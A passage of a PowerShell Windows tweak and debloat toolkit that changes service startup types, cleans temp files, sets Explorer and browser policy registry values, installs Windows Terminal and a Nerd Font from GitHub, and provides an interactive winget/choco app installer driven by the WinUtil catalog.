        'WSearch'       = 'Manual'
        'Fax'           = 'Manual'
        'RetailDemo'    = 'Disabled'
        'RemoteRegistry'= 'Disabled'
    }

    foreach ($name in $serviceMap.Keys) {
        $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
        if (-not $svc) { continue }

        if ($serviceMap[$name] -eq 'Disabled') {
            Stop-Service -Name $name -Force -ErrorAction SilentlyContinue
            Set-Service -Name $name -StartupType Disabled -ErrorAction SilentlyContinue
        } else {
            Set-Service -Name $name -StartupType Manual -ErrorAction SilentlyContinue
        }
    }

    Show-OK 'Selected non-essential services optimized.'
}

function Clear-TemporaryFiles {
    Show-Info 'Cleaning temporary files...'

    $targets = @(
        $env:TEMP,
        (Join-Path $env:LOCALAPPDATA 'Temp')
    ) | Select-Object -Unique

    foreach ($target in $targets) {
        if (-not $target -or -not (Test-Path $target)) { continue }

        Get-ChildItem -Path $target -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.FullName -notlike ($script:TempRoot + '*') } |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }

    Show-OK 'Temporary user files cleaned.'
}

function Set-BestPerformanceVisuals {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name VisualFXSetting -Type DWord -Value 2

    Show-OK 'Visual effects set to best performance.'
}

function Set-TaskbarLeft {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name TaskbarAl -Type DWord -Value 0
    Show-OK 'Taskbar alignment set to Left.'
}

function Hide-TaskbarSearch {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Search'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name SearchboxTaskbarMode -Type DWord -Value 0
    Show-OK 'Taskbar Search hidden.'
}

function Hide-TaskView {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name ShowTaskViewButton -Type DWord -Value 0
    Show-OK 'Task View button hidden.'
}

function Set-ShowHiddenFiles {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name Hidden -Type DWord -Value 1
    Show-OK 'Hidden files enabled in Explorer.'
}

function Set-ExplorerThisPC {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name LaunchTo -Type DWord -Value 1
    Show-OK 'File Explorer now opens to This PC.'
}

function Set-ExplorerCompactMode {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name UseCompactMode -Type DWord -Value 1
    Show-OK 'File Explorer Compact View enabled.'
}

function Disable-StartRecommendations {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name Start_IrisRecommendations -Type DWord -Value 0 -ErrorAction SilentlyContinue
    Show-OK 'Start recommendations reduced.'
}

function Get-InstalledBrowsers {
    $found = New-Object System.Collections.Generic.List[string]
    $pf = [string]$env:ProgramFiles
    $pf86 = [string]${env:ProgramFiles(x86)}
    $local = [string]$env:LOCALAPPDATA
    $checks = @(
        @{Name='Microsoft Edge';Patterns=@('*Microsoft Edge*','*Edge*');Paths=@($(if($pf86){Join-Path $pf86 'Microsoft\Edge\Application\msedge.exe'}),$(if($pf){Join-Path $pf 'Microsoft\Edge\Application\msedge.exe'}))},
        @{Name='Google Chrome';Patterns=@('*Google Chrome*');Paths=@($(if($pf){Join-Path $pf 'Google\Chrome\Application\chrome.exe'}),$(if($pf86){Join-Path $pf86 'Google\Chrome\Application\chrome.exe'}),$(if($local){Join-Path $local 'Google\Chrome\Application\chrome.exe'}))},
        @{Name='Mozilla Firefox';Patterns=@('*Mozilla Firefox*');Paths=@($(if($pf){Join-Path $pf 'Mozilla Firefox\firefox.exe'}),$(if($pf86){Join-Path $pf86 'Mozilla Firefox\firefox.exe'}))},
        @{Name='Brave';Patterns=@('*Brave*');Paths=@($(if($pf){Join-Path $pf 'BraveSoftware\Brave-Browser\Application\brave.exe'}),$(if($pf86){Join-Path $pf86 'BraveSoftware\Brave-Browser\Application\brave.exe'}),$(if($local){Join-Path $local 'BraveSoftware\Brave-Browser\Application\brave.exe'}))},
        @{Name='Vivaldi';Patterns=@('*Vivaldi*');Paths=@($(if($local){Join-Path $local 'Vivaldi\Application\vivaldi.exe'}),$(if($pf){Join-Path $pf 'Vivaldi\Application\vivaldi.exe'}))},
        @{Name='Opera';Patterns=@('*Opera Stable*','*Opera GX*');Paths=@($(if($local){Join-Path $local 'Programs\Opera\launcher.exe'}),$(if($local){Join-Path $local 'Programs\Opera GX\launcher.exe'}))},
        @{Name='LibreWolf';Patterns=@('*LibreWolf*');Paths=@($(if($pf){Join-Path $pf 'LibreWolf\librewolf.exe'}))},
        @{Name='Zen Browser';Patterns=@('*Zen Browser*');Paths=@($(if($local){Join-Path $local 'zen\zen.exe'}),$(if($pf){Join-Path $pf 'Zen Browser\zen.exe'}))}
    )
    $uninstall = New-Object System.Collections.Generic.List[object]
    foreach ($key in @('HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')) {
        foreach ($entry in @(Get-ItemProperty $key -ErrorAction SilentlyContinue)) {
            if ($null -ne $entry) { $uninstall.Add($entry) }
        }
    }
    foreach ($check in $checks) {
        $hit = $false
        foreach ($p in @($check.Paths)) {
            if (-not [string]::IsNullOrWhiteSpace([string]$p) -and (Test-Path -LiteralPath $p)) {
                $hit = $true
                break
            }
        }
        if (-not $hit) {
            foreach ($pattern in @($check.Patterns)) {
                foreach ($entry in $uninstall) {
                    $displayName = [string](Get-CuteProperty -Object $entry -Name 'DisplayName' -Default '')
                    if (-not [string]::IsNullOrWhiteSpace($displayName) -and $displayName -like $pattern) {
                        $hit = $true
                        break
                    }
                }
                if ($hit) { break }
            }
        }
        if ($hit -and -not $found.Contains([string]$check.Name)) {
            $found.Add([string]$check.Name)
        }
    }
    return @($found)
}

function Remove-BrowserTasks {
    $script:TaskCatalog = @($TaskCatalog | Where-Object { $_.Category -ne 'Browser' })
    Set-Variable -Name TaskCatalog -Scope Script -Value $script:TaskCatalog
}

function Update-BrowserTasks {
    Remove-BrowserTasks
    $detected = @(Get-InstalledBrowsers)
    $add = New-Object System.Collections.Generic.List[object]
    if ($detected -contains 'Microsoft Edge') {
        $add.Add([pscustomobject]@{Id='BrowserEdge';Category='Browser';Name='Debloat Microsoft Edge';Admin='No';Risk='Safe';Selected=$false})
    }
    if ($detected -contains 'Google Chrome') {
        $add.Add([pscustomobject]@{Id='BrowserChrome';Category='Browser';Name='Debloat Google Chrome';Admin='No';Risk='Safe';Selected=$false})
    }
    if ($detected -contains 'Mozilla Firefox') {
        $add.Add([pscustomobject]@{Id='BrowserFirefox';Category='Browser';Name='Debloat Mozilla Firefox';Admin='No';Risk='Safe';Selected=$false})
    }
    if ($detected -contains 'Brave') {
        $add.Add([pscustomobject]@{Id='BrowserBrave';Category='Browser';Name='Debloat Brave';Admin='No';Risk='Safe';Selected=$false})
    }
    foreach ($item in $add) { $script:TaskCatalog += $item }
    Set-Variable -Name TaskCatalog -Scope Script -Value $script:TaskCatalog
    return $detected
}

function Set-ChromiumBrowserDebloat {
    param([string]$PolicyPath,[string]$Name)
    New-Item -Path $PolicyPath -Force | Out-Null
    Set-ItemProperty -Path $PolicyPath -Name BackgroundModeEnabled -Type DWord -Value 0
    Set-ItemProperty -Path $PolicyPath -Name MetricsReportingEnabled -Type DWord -Value 0
    if ($Name -eq 'Microsoft Edge') {
        Set-ItemProperty -Path $PolicyPath -Name StartupBoostEnabled -Type DWord -Value 0
        Set-ItemProperty -Path $PolicyPath -Name HubsSidebarEnabled -Type DWord -Value 0
        Set-ItemProperty -Path $PolicyPath -Name ShowRecommendationsEnabled -Type DWord -Value 0
        Set-ItemProperty -Path $PolicyPath -Name PersonalizationReportingEnabled -Type DWord -Value 0
    }
    Show-OK ($Name + ' background activity and recommendations reduced.')
}

function Set-FirefoxDebloat {
    $path = 'HKCU:\Software\Policies\Mozilla\Firefox'
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name DisableTelemetry -Type DWord -Value 1
    Set-ItemProperty -Path $path -Name DisableStudies -Type DWord -Value 1
    Set-ItemProperty -Path $path -Name DisablePocket -Type DWord -Value 1
    Show-OK 'Mozilla Firefox telemetry, studies and Pocket disabled.'
}

function Invoke-BrowserDebloat {
    param([string]$Id)
    switch ($Id) {
        'BrowserEdge' { Set-ChromiumBrowserDebloat -PolicyPath 'HKCU:\Software\Policies\Microsoft\Edge' -Name 'Microsoft Edge' }
        'BrowserChrome' { Set-ChromiumBrowserDebloat -PolicyPath 'HKCU:\Software\Policies\Google\Chrome' -Name 'Google Chrome' }
        'BrowserFirefox' { Set-FirefoxDebloat }
        'BrowserBrave' { Set-ChromiumBrowserDebloat -PolicyPath 'HKCU:\Software\Policies\BraveSoftware\Brave' -Name 'Brave' }
    }
}

function Test-WindowsTerminalInstalled {
    Refresh-ProcessPath

    if(Get-Command wt.exe -ErrorAction SilentlyContinue){
        return $true
    }

    try{
        $pkg=Get-AppxPackage -Name 'Microsoft.WindowsTerminal' -ErrorAction SilentlyContinue |
            Select-Object -First 1

        return ($null -ne $pkg)
    }
    catch{
        return $false
    }
}

function Install-WindowsTerminal {
    $build=[Environment]::OSVersion.Version.Build

    if($build -lt 19041){
        throw 'Windows Terminal requires Windows 10 build 19041 or newer.'
    }

    if(Test-WindowsTerminalInstalled){
        Show-OK 'Windows Terminal is already installed.'
        return
    }

    $winget=Get-WinGetPath
    if(-not $winget){
        throw 'WinGet is required to install Windows Terminal.'
    }

    Show-Info 'Installing Windows Terminal...'

    $args=@(
        'install',
        '--id','Microsoft.WindowsTerminal',
        '-e',
        '--silent',
        '--accept-package-agreements',
        '--accept-source-agreements'
    )

    $proc=Start-Process `
        -FilePath $winget `
        -ArgumentList $args `
        -WindowStyle Hidden `
        -PassThru

    $exit=Wait-CuteProcess -Process $proc -Label 'Windows Terminal'

    Refresh-ProcessPath

    if($exit -ne 0 -and -not (Test-WindowsTerminalInstalled)){
        throw ('Windows Terminal installer returned exit code '+$exit+'.')
    }

    Show-OK 'Windows Terminal installed.'
}

function Test-CuteNerdFontInstalled {
    $fontDir=Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Fonts'

    if(Test-Path -LiteralPath (Join-Path $fontDir 'JetBrainsMonoNerdFontMono-Regular.ttf')){
        return $true
    }

    try{
        $reg='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Fonts'

        if(Test-Path -LiteralPath $reg){
            $props=Get-ItemProperty -LiteralPath $reg -ErrorAction SilentlyContinue

            foreach($prop in $props.PSObject.Properties){
                if(
                    $prop.Name -match '(?i)JetBrains.*Nerd.*Mono' -or
                    ([string]$prop.Value) -match '(?i)JetBrainsMonoNerdFontMono'
                ){
                    return $true
                }
            }
        }
    }
    catch{}

    return $false
}

function Initialize-CuteFontBroadcast {
    if('CuteFontBroadcast' -as [type]){return}

    Add-Type @'
using System;
using System.Runtime.InteropServices;

public static class CuteFontBroadcast
{
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SendMessageTimeout(
        IntPtr hWnd,
        uint Msg,
        IntPtr wParam,
        IntPtr lParam,
        uint fuFlags,
        uint uTimeout,
        out IntPtr lpdwResult
    );
}
'@
}

function Install-CuteNerdFont {
    if(Test-CuteNerdFontInstalled){
        Show-OK 'JetBrainsMono Nerd Font is already installed.'
        return
    }

    Ensure-Temp
    Show-Info 'Downloading JetBrainsMono Nerd Font...'

    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

    $release=Invoke-RestMethod `
        -Uri 'https://api.github.com/repos/ryanoasis/nerd-fonts/releases/latest' `
        -Headers @{'User-Agent'='CUTE-Toolkit'} `
        -ErrorAction Stop

    $asset=$release.assets |
        Where-Object { $_.name -eq 'JetBrainsMono.zip' } |
        Select-Object -First 1

    if(-not $asset){
        throw 'JetBrainsMono Nerd Font release asset was not found.'
    }

    $zip=Join-Path $script:TempRoot 'JetBrainsMono-NerdFont.zip'
    $extract=Join-Path $script:TempRoot 'JetBrainsMono-NerdFont'

    Download-CuteFile `
        -Url $asset.browser_download_url `
        -Destination $zip `
        -Label 'JetBrainsMono Nerd Font'

    if(Test-Path -LiteralPath $extract){
        Remove-Item -LiteralPath $extract -Recurse -Force -ErrorAction SilentlyContinue
    }

    Expand-Archive -LiteralPath $zip -DestinationPath $extract -Force

    $wanted=@(
        'JetBrainsMonoNerdFontMono-Regular.ttf',
        'JetBrainsMonoNerdFontMono-Bold.ttf',
        'JetBrainsMonoNerdFontMono-Italic.ttf',
        'JetBrainsMonoNerdFontMono-BoldItalic.ttf'
    )

    $files=@()

    foreach($name in $wanted){
        $hit=Get-ChildItem -LiteralPath $extract -Filter $name -Recurse -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

        if($hit){
            $files += $hit
        }
    }

    if($files.Count -eq 0){
        $fallback=Get-ChildItem -LiteralPath $extract -Filter '*NerdFontMono-Regular.ttf' -Recurse -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

        if($fallback){
            $files=@($fallback)
        }
    }

    if($files.Count -eq 0){
        throw 'JetBrainsMono Nerd Font files were not found after extraction.'
    }

    $fontDir=Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Fonts'
    New-Item -ItemType Directory -Path $fontDir -Force|Out-Null

    $reg='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Fonts'
    New-Item -Path $reg -Force|Out-Null

    foreach($file in $files){
        $dest=Join-Path $fontDir $file.Name
        Copy-Item -LiteralPath $file.FullName -Destination $dest -Force

        $regName=([IO.Path]::GetFileNameWithoutExtension($file.Name))+' (TrueType)'
        New-ItemProperty `
            -Path $reg `
            -Name $regName `
            -PropertyType String `
            -Value $file.Name `
            -Force|Out-Null
    }

    try{
        Initialize-CuteFontBroadcast
        $result=[IntPtr]::Zero
        [void][CuteFontBroadcast]::SendMessageTimeout(
            [IntPtr]0xffff,
            0x001D,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            0x0002,
            1000,
            [ref]$result
        )
    }
    catch{}

    Show-OK 'JetBrainsMono Nerd Font installed.'
}

function Get-WindowsTerminalSettingsPath {
    try{
        $pkg=Get-AppxPackage -Name 'Microsoft.WindowsTerminal' -ErrorAction SilentlyContinue |
            Select-Object -First 1

        if($pkg -and $pkg.PackageFamilyName){
            $dir=Join-Path $env:LOCALAPPDATA ('Packages\'+$pkg.PackageFamilyName+'\LocalState')
            New-Item -ItemType Directory -Path $dir -Force|Out-Null
            return (Join-Path $dir 'settings.json')
        }
    }
    catch{}

    $dir=Join-Path $env:LOCALAPPDATA 'Microsoft\Windows Terminal'
    New-Item -ItemType Directory -Path $dir -Force|Out-Null
    return (Join-Path $dir 'settings.json')
}

function ConvertFrom-CuteTerminalJson {
    param([string]$Raw)

    if([string]::IsNullOrWhiteSpace($Raw)){
        return [pscustomobject]@{}
    }

    $lines=@()

    foreach($line in ($Raw -split "`r?`n")){
        if($line.TrimStart().StartsWith('//')){
            continue
        }

        $lines += $line
    }

    $clean=($lines -join [Environment]::NewLine)
    $clean=[regex]::Replace($clean,',\s*([}\]])','$1')

    return ($clean | ConvertFrom-Json -ErrorAction Stop)
}

function Set-CuteObjectProperty {
    param(
        [Parameter(Mandatory)]$Object,
        [Parameter(Mandatory)][string]$Name,
        $Value
    )

    $prop=$Object.PSObject.Properties[$Name]

    if($prop){
        $Object.$Name=$Value
    }
    else{
        $Object | Add-Member -NotePropertyName $Name -NotePropertyValue $Value -Force
    }
}

function Set-WindowsTerminalCuteConfig {
    $settingsPath=Get-WindowsTerminalSettingsPath
    $settings=[pscustomobject]@{}

    if(Test-Path -LiteralPath $settingsPath){
        $backup=$settingsPath+'.cute-backup-'+(Get-Date -Format 'yyyyMMdd-HHmmss')

        try{
            Copy-Item -LiteralPath $settingsPath -Destination $backup -Force
        }
        catch{}

        try{
            $raw=Get-Content -LiteralPath $settingsPath -Raw -ErrorAction Stop
            $settings=ConvertFrom-CuteTerminalJson -Raw $raw
        }
        catch{
            $settings=[pscustomobject]@{}
        }
    }

    $profilesProp=$settings.PSObject.Properties['profiles']

    if(-not $profilesProp -or $null -eq $profilesProp.Value){
        Set-CuteObjectProperty -Object $settings -Name 'profiles' -Value ([pscustomobject]@{})
    }

    $profiles=$settings.PSObject.Properties['profiles'].Value
    $defaultsProp=$profiles.PSObject.Properties['defaults']

    if(-not $defaultsProp -or $null -eq $defaultsProp.Value){
        Set-CuteObjectProperty -Object $profiles -Name 'defaults' -Value ([pscustomobject]@{})
    }

    $defaults=$profiles.PSObject.Properties['defaults'].Value

    Set-CuteObjectProperty -Object $defaults -Name 'opacity' -Value ([int]$Config.TerminalOpacity)
    Set-CuteObjectProperty -Object $defaults -Name 'useAcrylic' -Value $true
    Set-CuteObjectProperty -Object $defaults -Name 'padding' -Value '12, 10, 12, 10'
    Set-CuteObjectProperty -Object $defaults -Name 'cursorShape' -Value 'filledBox'
    Set-CuteObjectProperty -Object $defaults -Name 'antialiasingMode' -Value 'cleartype'

    $font=[pscustomobject]@{
        face=$Config.TerminalFont
        size=11
        weight='normal'
    }

    Set-CuteObjectProperty -Object $defaults -Name 'font' -Value $font
    Set-CuteObjectProperty -Object $settings -Name 'theme' -Value 'dark'
    Set-CuteObjectProperty -Object $settings -Name 'useAcrylicInTabRow' -Value $true
    Set-CuteObjectProperty -Object $settings -Name 'alwaysShowTabs' -Value $true

    if(-not $profiles.PSObject.Properties['list']){
        Set-CuteObjectProperty -Object $profiles -Name 'list' -Value @()
    }

    $json=$settings | ConvertTo-Json -Depth 100

    [IO.File]::WriteAllText(
        $settingsPath,
        $json,
        (New-Object Text.UTF8Encoding($false))
    )

    Show-OK ('Windows Terminal configured: '+$Config.TerminalFont+', '+$Config.TerminalOpacity+'% opacity.')
}

function Ensure-WindowsTerminalSetup {
    Install-WindowsTerminal
    Install-CuteNerdFont
    Set-WindowsTerminalCuteConfig
}

function Get-CuteAppCatalog {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $uri = 'https://raw.githubusercontent.com/ChrisTitusTech/winutil/main/config/applications.json'
    $json = Invoke-RestMethod -Uri $uri -Method Get -UserAgent 'CUTE-Toolkit/7.0' -ErrorAction Stop
    $items = @()
    foreach ($prop in $json.PSObject.Properties) {
        $v = $prop.Value
        $name = [string](Get-CuteProperty -Object $v -Name 'content' -Default '')
        if ([string]::IsNullOrWhiteSpace($name)) { continue }
        $category = [string](Get-CuteProperty -Object $v -Name 'category' -Default 'Other')
        $wingetId = [string](Get-CuteProperty -Object $v -Name 'winget' -Default '')
        $chocoId = [string](Get-CuteProperty -Object $v -Name 'choco' -Default '')
        $items += [pscustomobject]@{
            Key=[string]$prop.Name
            Name=$name
            Category=$category
            Winget=$wingetId
            Choco=$chocoId
            Selected=$false
        }
    }
    return @($items | Sort-Object Category,Name)
}

function Repair-WinGet {
    param([switch]$Force)

    if (Get-WinGetPath) {
        Show-OK 'WinGet is already installed.'
        return $true
    }

    Show-Warn 'WinGet is not available.'

    if(-not $Force){
        CWrite '   Press Y to try Microsoft WinGet repair/install, or N to return.' Yellow
        $k = [Console]::ReadKey($true)
        if ($k.Key -ne 'Y') { return $false }
    }
    else{
        Show-Info 'Installing WinGet as part of the default Tufa7 Tweak setup...'
    }

    $command = @'
$ErrorActionPreference='Stop'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
Install-PackageProvider -Name NuGet -Force | Out-Null
Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
Install-Module Microsoft.WinGet.Client -Force -AllowClobber -Repository PSGallery -Scope AllUsers -Confirm:$false
Import-Module Microsoft.WinGet.Client
Repair-WinGetPackageManager -AllUsers -Force -Latest
'@

    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    try {
        if(Test-IsAdministrator){
            $p = Start-Process powershell.exe `
                -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$encoded) `
                -WindowStyle Hidden `
                -PassThru `
                -Wait
        }
        else{
            $p = Start-Process powershell.exe `
                -Verb RunAs `
                -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$encoded) `
                -PassThru `
                -Wait
        }

        Refresh-ProcessPath
        $ok=($p.ExitCode -eq 0 -and [bool](Get-WinGetPath))

        if($ok){
            Show-OK 'WinGet installed.'
            return $true
        }

        Show-Warn 'WinGet installation did not complete.'
        return $false
    }
    catch {
        Show-Warn 'WinGet installation was cancelled or failed.'
        return $false
    }
}

function Ensure-WinGetDefault {
    if(Get-WinGetPath){
        Show-OK 'WinGet is already installed.'
        return
    }

    if(-not (Repair-WinGet -Force)){
        throw 'WinGet could not be installed.'
    }
}

function Install-CatalogApp {
    param($App)
    Refresh-ProcessPath
    $winget = Get-WinGetPath
    $choco = Get-Command choco.exe -ErrorAction SilentlyContinue
    if ($winget -and -not [string]::IsNullOrWhiteSpace($App.Winget) -and $App.Winget -ne 'na') {
        $args = @('install','--id',$App.Winget,'-e','--silent','--accept-package-agreements','--accept-source-agreements')
        $p = Start-Process $winget -ArgumentList $args -PassThru -WindowStyle Hidden
        $code = Wait-CuteProcess -Process $p -Label $App.Name
        if ($code -ne 0) { throw ($App.Name + ' returned exit code ' + $code) }
        return
    }
    if ($choco -and -not [string]::IsNullOrWhiteSpace($App.Choco) -and $App.Choco -ne 'na') {
        $packages = ($App.Choco -split ';') | Where-Object { $_ }
        foreach ($pkg in $packages) {
            $p = Start-Process $choco.Source -ArgumentList @('install',$pkg,'-y','--no-progress') -PassThru -WindowStyle Hidden
            $code = Wait-CuteProcess -Process $p -Label $App.Name
            if ($code -ne 0) { throw ($App.Name + ' returned exit code ' + $code) }
        }
        return
    }
    throw ('No available package-manager entry for ' + $App.Name)
}

function Get-Tufa7AppCategories {
    param([object[]]$Apps)

    $categories=@(
        $Apps |
            ForEach-Object { [string]$_.Category } |
            Where-Object { -not [string]::IsNullOrWhiteSpace($_) } |
            Sort-Object -Unique
    )

    return @('ALL') + $categories
}

function Select-Tufa7AppCategory {
    param(
        [Parameter(Mandatory)][object[]]$Apps,
        [string]$Current='ALL'
    )

    $categories=@(Get-Tufa7AppCategories -Apps $Apps)
    $index=[Array]::IndexOf($categories,$Current)
    if($index -lt 0){$index=0}

    Show-Logo
    Show-Section 'APP CATEGORIES'
    CWrite '   Pick a section: [ UP ] / [ DOWN ] move   [ ENTER ] open   [ Q ] back' DarkGray
    CWrite ''

    $top=[Console]::CursorTop
    $pageSize=14
    try{$pageSize=[Math]::Max(7,[Math]::Min(18,[Console]::WindowHeight-$top-3))}catch{}

    while($true){
        Clear-CuteRows -Top $top -Count ($pageSize+2)

        $start=[Math]::Max(0,[Math]::Min($index-[int]($pageSize/2),[Math]::Max(0,$categories.Count-$pageSize)))
        $end=[Math]::Min($categories.Count-1,$start+$pageSize-1)

        for($i=$start;$i -le $end;$i++){
            $category=$categories[$i]
            $count=if($category -eq 'ALL'){$Apps.Count}else{@($Apps|Where-Object Category -eq $category).Count}
            $label=('{0}  ({1})' -f $category,$count)

            if($i -eq $index){
                CWrite ('   > '+$label) Cyan
            }
            else{
                CWrite ('     '+$label) Gray
            }
        }

        CWrite ''
        CWrite ('   Category '+($index+1)+'/'+$categories.Count) DarkGray

        $key=[Console]::ReadKey($true)
        switch($key.Key){
            'UpArrow'{$index--;if($index -lt 0){$index=$categories.Count-1}}
            'DownArrow'{$index++;if($index -ge $categories.Count){$index=0}}
            'PageUp'{$index=[Math]::Max(0,$index-$pageSize)}
            'PageDown'{$index=[Math]::Min($categories.Count-1,$index+$pageSize)}
            'Enter'{return $categories[$index]}
            'Q'{return $null}
            'Escape'{return $null}
        }
    }
}

function Show-Tufa7AppList {
    param(
        [Parameter(Mandatory)][object[]]$Apps,
        [Parameter(Mandatory)][string]$Category
    )

    $cursor=0
    $query=''

    while($true){
        $filtered=@(
            $Apps |
                Where-Object {
                    ($Category -eq 'ALL' -or $_.Category -eq $Category) -and
                    (
                        [string]::IsNullOrWhiteSpace($query) -or
                        $_.Name -like ('*'+$query+'*')
                    )
                }
        )

        if($filtered.Count -eq 0){$cursor=0}
        elseif($cursor -ge $filtered.Count){$cursor=$filtered.Count-1}

        Show-Logo
        Show-Section 'APPS'
        CWrite ('   Category: '+$Category+'   Search: '+$(if($query){$query}else{'None'})) Cyan
        CWrite '   [ UP ] / [ DOWN ] move   [ SPACE ] select   [ S ] search   [ C ] categories   [ ENTER ] install   [ Q ] back' DarkGray
        CWrite ''

        $listTop=[Console]::CursorTop
        $pageSize=16
        try{$pageSize=[Math]::Max(7,[Math]::Min(20,[Console]::WindowHeight-$listTop-4))}catch{}
        $needsFullHeader=$false

        while(-not $needsFullHeader){
            $filtered=@(
                $Apps |
                    Where-Object {
                        ($Category -eq 'ALL' -or $_.Category -eq $Category) -and
                        (
                            [string]::IsNullOrWhiteSpace($query) -or
                            $_.Name -like ('*'+$query+'*')
                        )
                    }
            )

            if($filtered.Count -eq 0){$cursor=0}
            elseif($cursor -ge $filtered.Count){$cursor=$filtered.Count-1}

            Clear-CuteRows -Top $listTop -Count ($pageSize+3)

            if($filtered.Count -eq 0){
                Show-Warn 'No applications match this section/search.'
            }
            else{
                $start=[Math]::Max(0,[Math]::Min($cursor-[int]($pageSize/2),[Math]::Max(0,$filtered.Count-$pageSize)))
                $end=[Math]::Min($filtered.Count-1,$start+$pageSize-1)

                for($i=$start;$i -le $end;$i++){
                    $app=$filtered[$i]
                    $pointer=if($i -eq $cursor){'>'}else{' '}
                    $dot=if($app.Selected){'[●]'}else{'[○]'}

                    CWrite ('   '+$pointer+' ') $(if($i -eq $cursor){'Cyan'}else{'DarkGray'}) -NoNewline
                    CWrite ($dot.PadRight(5)) $(if($app.Selected){'Cyan'}else{'DarkGray'}) -NoNewline
                    CWrite (('['+$app.Category+']').PadRight(24)) DarkGray -NoNewline
                    CWrite $app.Name White
                }
            }

            CWrite ''
            CWrite ('   Showing: '+$filtered.Count+'   Selected total: '+@($Apps|Where-Object Selected).Count) Cyan

            $key=[Console]::ReadKey($true)
            switch($key.Key){
                'UpArrow'{
                    if($filtered.Count){
                        $cursor--
                        if($cursor -lt 0){$cursor=$filtered.Count-1}
                    }
                }
                'DownArrow'{
                    if($filtered.Count){
                        $cursor++
                        if($cursor -ge $filtered.Count){$cursor=0}
                    }
                }
                'PageUp'{
                    if($filtered.Count){$cursor=[Math]::Max(0,$cursor-$pageSize)}
                }
                'PageDown'{
                    if($filtered.Count){$cursor=[Math]::Min($filtered.Count-1,$cursor+$pageSize)}
                }
                'Spacebar'{
                    if($filtered.Count){
                        $filtered[$cursor].Selected=-not $filtered[$cursor].Selected
                    }
                }
                'S'{
                    try{
                        [Console]::SetCursorPosition(0,$listTop+$pageSize+3)
                    }catch{}
                    CWrite ''
                    $query=Read-Host '   Search apps'
                    $cursor=0
                    $needsFullHeader=$true
                }
                'C'{return 'Categories'}
                'Q'{return 'Back'}
                'Escape'{return 'Back'}
                'Enter'{
                    $selected=@($Apps|Where-Object Selected)
                    if($selected.Count -eq 0){continue}

                    Show-Logo
                    Show-Section 'INSTALLING APPLICATIONS'

                    foreach($app in $selected){
                        try{
                            Install-CatalogApp -App $app
                            Show-OK ($app.Name+' installed.')
                        }
                        catch{
                            Show-ErrorText ($app.Name+': '+$_.Exception.Message)
                        }
                    }

                    Pause-Cute
                    return 'Back'
                }
            }
        }
    }
}

function Show-AppInstaller {
    Show-Logo
    Show-Section 'APPS'
    Show-Info 'Syncing the live WinUtil application catalog...'

    try{$apps=@(Get-CuteAppCatalog)}
    catch{
        Show-ErrorText 'Could not load the application catalog.'
        Pause-Cute
        return
    }

    if(-not (Get-WinGetPath) -and -not (Get-Command choco.exe -ErrorAction SilentlyContinue)){
        if(-not (Repair-WinGet -Force)){
            Show-Warn 'No package manager is available.'
            Pause-Cute
            return
        }
    }

    $category='ALL'

    while($true){
        $category=Select-Tufa7AppCategory -Apps $apps -Current $category
        if($null -eq $category){return}

        $result=Show-Tufa7AppList -Apps $apps -Category $category
        if($result -eq 'Back'){return}
    }
}

function Initialize-CuteVirtualTerminal {
    if('CuteVirtualTerminal' -as [type]){return}

    Add-Type @'
using System;
using System.Runtime.InteropServices;

public static class CuteVirtualTerminal
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
}
'@
}

function Enable-CuteVirtualTerminal {
    try{
        Initialize-CuteVirtualTerminal

        $handle=[CuteVirtualTerminal]::GetStdHandle(-11)
        $mode=0

        if([CuteVirtualTerminal]::GetConsoleMode($handle,[ref]$mode)){
            [void][CuteVirtualTerminal]::SetConsoleMode($handle,($mode -bor 0x0004))
        }
    }
    catch{}
}

function Get-CuteWallpaperFolder {
    $pictures=[Environment]::GetFolderPath('MyPictures')

    if([string]::IsNullOrWhiteSpace($pictures)){
        $pictures=Join-Path $HOME 'Pictures'
    }

